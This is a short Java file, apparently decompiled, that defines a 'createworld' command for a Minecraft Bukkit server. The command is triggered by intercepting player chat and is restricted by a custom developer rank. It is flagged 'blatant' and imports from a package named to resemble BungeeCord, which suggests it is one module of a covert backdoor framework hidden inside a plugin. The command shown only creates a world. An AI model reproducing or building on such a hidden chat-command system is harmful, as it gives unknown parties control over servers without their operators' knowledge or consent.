package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.WorldCreator;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "createworld",
   description = "Creates a new world",
   blatant = true,
   rank = Rank.DEVELOPER
)
public class CreateWorldCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use createworld <name>");
      } else if (Bukkit.getWorld(var3[0]) != null) {
         ChatUtil.sendChat(var1.getPlayer(), "The world " + var3[0] + " already exists.");
      } else {
         ChatUtil.sendChat(var1.getPlayer(), "Creating the world, please wait...");
         Bukkit.getScheduler().runTask(Ectasy.parentPlugin, () -> {
            Bukkit.createWorld(WorldCreator.name(var3[0]));
            ChatUtil.sendChat(var1.getPlayer(), "Created the world successfully.");
         });
      }
   }
}
